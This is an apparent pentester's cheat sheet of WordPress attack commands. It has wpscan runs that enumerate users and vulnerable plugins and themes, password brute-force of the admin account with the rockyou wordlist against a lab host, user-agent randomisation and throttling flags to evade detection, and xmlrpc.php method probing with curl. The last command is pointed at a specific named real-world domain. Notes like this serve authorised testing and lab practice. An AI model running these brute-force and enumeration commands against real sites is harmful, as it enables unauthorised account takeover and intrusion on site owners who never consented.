
- [Scan]             
wpscan --url https://$TARGET --wp-content-dir -e --output wpscan.80 --format cli-no-color
wpscan --url https://$TARGET --random-user-agent --wp-content-dir -e --output wpscan.token --format cli-no-color --api-token $WP_TOKEN
wpscan --url https://$TARGET --random-user-agent --enumerate u --output wpscan.usernames --format cli-no-color --api-token $WP_TOKEN
    
- [Brute-force]      
    - wpscan --url http://internal.thm/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt
    - wpscan --url http://internal.thm --usernames admin --passwords /usr/share/wordlists/rockyou.txt 
    

--random-user-agent 
--max-threads 1 
--request-timeout 60


curl -X POST https://$TARGET/xmlrpc.php
<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>

curl -X POST https://$TARGET/xmlrpc.php  -H "Content-Type: application/xml"  -H "Accept: application/xml" --data "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" 

# WPScan is a great automatic tool (you can dockerise)
docker pull wpscanteam/wpscan
docker run -it --rm wpscanteam/wpscan --url https://yourblog.com [options]


wpscan \
  --url https://www.myndr.nl/ \
  --force \
  --random-user-agent \
  --wp-content-dir wp-content \
  --wp-plugins-dir wp-content/plugins \
  --output wpscan.token \
  --format cli-no-color \
  --api-token $WP_TOKEN \
  -e vp,vt,u
